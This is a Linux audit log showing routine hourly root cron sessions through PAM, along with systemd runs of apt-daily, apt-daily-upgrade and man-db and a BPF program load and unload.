type=USER_END msg=audit(1789352221.724:225): pid=899 uid=0 auid=0 ses=11 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789355821.740:226): pid=915 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789355821.740:227): pid=915 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789355821.740:228): pid=915 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=12 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789355821.740:228): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=915 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=12 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789355821.740:228): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789355821.740:229): pid=915 uid=0 auid=0 ses=12 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789355821.744:230): pid=916 uid=0 auid=0 ses=12 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789355821.748:231): pid=915 uid=0 auid=0 ses=12 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789355821.748:232): pid=915 uid=0 auid=0 ses=12 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789359421.764:233): pid=935 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789359421.764:234): pid=935 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789359421.764:235): pid=935 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=13 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789359421.764:235): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=935 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=13 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789359421.764:235): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789359421.764:236): pid=935 uid=0 auid=0 ses=13 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789359421.768:237): pid=936 uid=0 auid=0 ses=13 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789359421.772:238): pid=935 uid=0 auid=0 ses=13 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789359421.772:239): pid=935 uid=0 auid=0 ses=13 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=SERVICE_START msg=audit(1789362487.124:240): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=apt-daily-upgrade comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789362487.124:241): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=apt-daily-upgrade comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789363021.792:242): pid=1004 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789363021.792:243): pid=1004 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789363021.792:244): pid=1004 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=14 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789363021.792:244): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=1004 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=14 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789363021.792:244): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789363021.792:245): pid=1004 uid=0 auid=0 ses=14 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789363021.796:246): pid=1005 uid=0 auid=0 ses=14 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789363021.796:247): pid=1004 uid=0 auid=0 ses=14 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789363021.796:248): pid=1004 uid=0 auid=0 ses=14 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789363501.804:249): pid=1009 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789363501.804:250): pid=1009 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789363501.804:251): pid=1009 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=15 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789363501.804:251): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=1009 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=15 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789363501.804:251): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789363501.804:252): pid=1009 uid=0 auid=0 ses=15 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789363501.804:253): pid=1010 uid=0 auid=0 ses=15 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789363501.812:254): pid=1009 uid=0 auid=0 ses=15 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789363501.812:255): pid=1009 uid=0 auid=0 ses=15 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=BPF msg=audit(1789364459.784:256): prog-id=13 op=LOAD
type=SERVICE_START msg=audit(1789364460.156:257): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=man-db comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789364460.156:258): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=man-db comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789364460.176:259): prog-id=13 op=UNLOAD
type=USER_ACCT msg=audit(1789366621.832:260): pid=1035 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789366621.832:261): pid=1035 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789366621.832:262): pid=1035 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=16 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789366621.832:262): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=1035 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=16 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789366621.832:262): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789366621.832:263): pid=1035 uid=0 auid=0 ses=16 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789366621.836:264): pid=1036 uid=0 auid=0 ses=16 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789366621.836:265): pid=1035 uid=0 auid=0 ses=16 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789366621.836:266): pid=1035 uid=0 auid=0 ses=16 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789370221.856:267): pid=1054 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789370221.856:268): pid=1054 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789370221.856:269): pid=1054 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=17 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789370221.856:269): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=1054 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=17 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789370221.856:269): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789370221.856:270): pid=1054 uid=0 auid=0 ses=17 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789370221.860:271): pid=1055 uid=0 auid=0 ses=17 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789370221.860:272): pid=1054 uid=0 auid=0 ses=17 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789370221.860:273): pid=1054 uid=0 auid=0 ses=17 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789373821.884:274): pid=1075 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789373821.884:275): pid=1075 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789373821.884:276): pid=1075 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=18 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789373821.884:276): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=1075 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=18 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789373821.884:276): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789373821.884:277): pid=1075 uid=0 auid=0 ses=18 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789373821.888:278): pid=1076 uid=0 auid=0 ses=18 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789373821.888:279): pid=1075 uid=0 auid=0 ses=18 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789373821.888:280): pid=1075 uid=0 auid=0 ses=18 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=SERVICE_START msg=audit(1789374886.308:281): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=apt-daily comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789374886.308:282): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=apt-daily comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789377421.912:283): pid=1145 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789377421.912:284): pid=1145 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789377421.912:285): pid=1145 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=19 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789377421.912:285): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=1145 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=19 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789377421.912:285): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789377421.912:286): pid=1145 uid=0 auid=0 ses=19 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789377421.916:287): pid=1146 uid=0 auid=0 ses=19 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789377421.916:288): pid=1145 uid=0 auid=0 ses=19 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789377421.920:289): pid=1145 uid=0 auid=0 ses=19 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789381021.936:290): pid=1163 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789381021.940:291): pid=1163 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789381021.940:292): pid=1163 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=20 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789381021.940:292): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=1163 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=20 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789381021.940:292): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789381021.940:293): pid=1163 uid=0 auid=0 ses=20 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789381021.944:294): pid=1164 uid=0 auid=0 ses=20 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789381021.944:295): pid=1163 uid=0 auid=0 ses=20 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789381021.944:296): pid=1163 uid=0 auid=0 ses=20 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789384621.964:297): pid=1179 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789384621.964:298): pid=1179 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789384621.964:299): pid=1179 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=21 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789384621.964:299): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=1179 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=21 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789384621.964:299): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789384621.968:300): pid=1179 uid=0 auid=0 ses=21 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789384621.968:301): pid=1180 uid=0 auid=0 ses=21 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789384621.972:302): pid=1179 uid=0 auid=0 ses=21 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789384621.972:303): pid=1179 uid=0 auid=0 ses=21 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789388221.988:304): pid=1198 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789388221.988:305): pid=1198 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789388221.988:306): pid=1198 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=22 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789388221.988:306): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=1198 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=22 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789388221.988:306): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789388221.992:307): pid=1198 uid=0 auid=0 ses=22 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789388221.992:308): pid=1199 uid=0 auid=0 ses=22 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789388221.996:309): pid=1198 uid=0 auid=0 ses=22 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789388221.996:310): pid=1198 uid=0 auid=0 ses=22 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789391821.011:311): pid=1214 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789391821.011:312): pid=1214 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789391821.011:313): pid=1214 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=23 res=1UID="root" OLD-AUID="unset" AUID="root"
